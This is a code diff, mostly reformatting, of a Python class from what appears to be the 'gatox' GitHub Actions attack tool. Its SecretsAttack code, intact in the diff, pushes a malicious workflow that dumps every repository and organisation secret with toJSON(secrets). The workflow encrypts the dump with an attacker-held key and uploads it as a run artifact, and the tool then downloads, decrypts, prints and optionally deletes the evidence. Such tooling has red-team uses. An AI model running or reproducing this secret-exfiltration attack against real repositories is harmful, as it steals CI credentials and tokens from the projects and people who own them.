@@ -31,6 +31,7 @@ from cryptography.hazmat.primitives.ciphers import modes
 from gatox.attack.attack import Attacker
 from gatox.cli.output import Output
 
+
 class SecretsAttack(Attacker):
     """This class contains methods to create malicious yaml files for accessing and
     exfiltrating GitHub Actions secrets files.
@@ -58,9 +59,7 @@ class SecretsAttack(Attacker):
             secrets.extend(org_secret_list)
 
         if not secrets:
-            Output.warn(
-                "The repository does not have any accessible secrets!"
-            )
+            Output.warn("The repository does not have any accessible secrets!")
             return False
         else:
             Output.owned(
@@ -68,7 +67,7 @@ class SecretsAttack(Attacker):
                 "accessible secret(s)!"
             )
 
-        secret_names = [secret['name'] for secret in secrets]
+        secret_names = [secret["name"] for secret in secrets]
 
         return secret_names
 
@@ -88,74 +87,67 @@ class SecretsAttack(Attacker):
         """
         yaml_file = {}
 
-        yaml_file['name'] = branch_name
-        yaml_file['on'] = {'push': {"branches": branch_name}}
+        yaml_file["name"] = branch_name
+        yaml_file["on"] = {"push": {"branches": branch_name}}
 
         test_job = {
-            'runs-on': ['ubuntu-latest'],
-            'steps': [
+            "runs-on": ["ubuntu-latest"],
+            "steps": [
                 {
-                    'env': {
-                        "VALUES":'${{ toJSON(secrets)}}'},
-                    'name': 'Prepare repository',
-                    'run': """
+                    "env": {"VALUES": "${{ toJSON(secrets)}}"},
+                    "name": "Prepare repository",
+                    "run": """
 cat <<EOF > output.json
 $VALUES
 EOF
-                    """
+                    """,
                 },
                 {
-                    'name': 'Run Tests',
-                    'env': {
-                        'PUBKEY': pubkey
-                    },
-                    'run': "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
-                           "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
-                           "echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo \"$PUBKEY\") -out lookup.txt 2> /dev/null;"
+                    "name": "Run Tests",
+                    "env": {"PUBKEY": pubkey},
+                    "run": "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
+                    "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
+                    'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
                 },
                 # Upload the encrypted files as workfow run artifacts.
                 # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
                 {
-                    'name': 'Upload artifacts',
-                    'uses': 'actions/upload-artifact@v4',
-                    'with': {
-                        'name': 'files',
-                        'path': " |\noutput_updated.json\nlookup.txt"
-                    }
-                }
-            ]
+                    "name": "Upload artifacts",
+                    "uses": "actions/upload-artifact@v4",
+                    "with": {
+                        "name": "files",
+                        "path": " |\noutput_updated.json\nlookup.txt",
+                    },
+                },
+            ],
         }
-        yaml_file['jobs'] = {'testing': test_job}
+        yaml_file["jobs"] = {"testing": test_job}
 
         return yaml.dump(yaml_file, sort_keys=False)
 
     @staticmethod
     def __create_private_key():
-        """Creates a private and public key to safely exfil secrets.
-        """
+        """Creates a private and public key to safely exfil secrets."""
         private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=4096,
-            backend=default_backend()
+            public_exponent=65537, key_size=4096, backend=default_backend()
         )
         public_key = private_key.public_key()
         pem = public_key.public_bytes(
             encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
+            format=serialization.PublicFormat.SubjectPublicKeyInfo,
         )
 
         return (private_key, pem.decode())
 
     @staticmethod
     def __decrypt_secrets(priv_key, encrypted_key, encrypted_secrets):
-        """Utility method to decrypt secrets given ciphertext blob and a private key.
-        """
+        """Utility method to decrypt secrets given ciphertext blob and a private key."""
         salt = encrypted_secrets[8:16]
         ciphertext = encrypted_secrets[16:]
 
         sym_key = priv_key.decrypt(encrypted_key, padding.PKCS1v15()).decode()
-        sym_key = sym_key.replace('\n','')
-        derived_key = hashlib.pbkdf2_hmac('sha256', sym_key.encode(), salt, 10000, 48)
+        sym_key = sym_key.replace("\n", "")
+        derived_key = hashlib.pbkdf2_hmac("sha256", sym_key.encode(), salt, 10000, 48)
         key = derived_key[0:32]
         iv = derived_key[32:48]
 
@@ -163,17 +155,18 @@ EOF
         decryptor = cipher.decryptor()
 
         cleartext = decryptor.update(ciphertext) + decryptor.finalize()
-        cleartext = cleartext[:-cleartext[-1]]
+        cleartext = cleartext[: -cleartext[-1]]
 
         return cleartext
 
     def secrets_dump(
-            self,
-            target_repo: str,
-            target_branch: str,
-            commit_message: str,
-            delete_action: bool,
-            yaml_name: str):
+        self,
+        target_repo: str,
+        target_branch: str,
+        commit_message: str,
+        delete_action: bool,
+        yaml_name: str,
+    ):
         """Given a user with write access to a repository, runs a workflow that
         dumps all repository secrets.
 
@@ -191,8 +184,10 @@ EOF
         if not self.user_perms:
             return False
 
-        if 'repo' in self.user_perms['scopes'] and \
-           'workflow' in self.user_perms['scopes']:
+        if (
+            "repo" in self.user_perms["scopes"]
+            and "workflow" in self.user_perms["scopes"]
+        ):
 
             secret_names = self.__collect_secret_names(target_repo)
 
@@ -203,8 +198,7 @@ EOF
             if target_branch:
                 branch = target_branch
             else:
-                branch = ''.join(random.choices(
-                    string.ascii_lowercase, k=10))
+                branch = "".join(random.choices(string.ascii_lowercase, k=10))
 
             res = self.api.get_repo_branch(target_repo, branch)
             if res == -1:
@@ -216,17 +210,11 @@ EOF
             priv_key, pubkey_pem = self.__create_private_key()
             yaml_contents = self.create_exfil_yaml(pubkey_pem, branch)
             workflow_id = self.execute_and_wait_workflow(
-                target_repo,
-                branch,
-                yaml_contents,
-                commit_message,
-                yaml_name
+                target_repo, branch, yaml_contents, commit_message, yaml_name
             )
             if not workflow_id:
                 return
-            res = self.api.retrieve_workflow_artifact(
-                target_repo, workflow_id
-            )
+            res = self.api.retrieve_workflow_artifact(target_repo, workflow_id)
 
             if not res:
                 Output.error("Failed to Retrieve workflow artifact!")
@@ -236,13 +224,15 @@ EOF
                 # lookup.txt is the encrypted AES key
                 # output_updated.json is the AES encrypted json blob
 
-                if 'output_updated.json' in res and 'lookup.txt' in res:
-                    cleartext = self.__decrypt_secrets(priv_key, res['lookup.txt'], res['output_updated.json'])
+                if "output_updated.json" in res and "lookup.txt" in res:
+                    cleartext = self.__decrypt_secrets(
+                        priv_key, res["lookup.txt"], res["output_updated.json"]
+                    )
                     Output.owned("Decrypted and Decoded Secrets:")
                     secrets = json.loads(cleartext)
 
                     for k, v in secrets.items():
-                        if k != 'github_token':
+                        if k != "github_token":
                             print(f"{k}={v}")
                 else:
                     Output.error("Unexpected run artifact structure!")
@@ -254,5 +244,5 @@ EOF
                     Output.result("Workflow deleted sucesfully!")
         else:
             Output.error(
-                "The user does not have the necessary scopes to conduct this "
-                "attack!")
+                "The user does not have the necessary scopes to conduct this " "attack!"
+            )
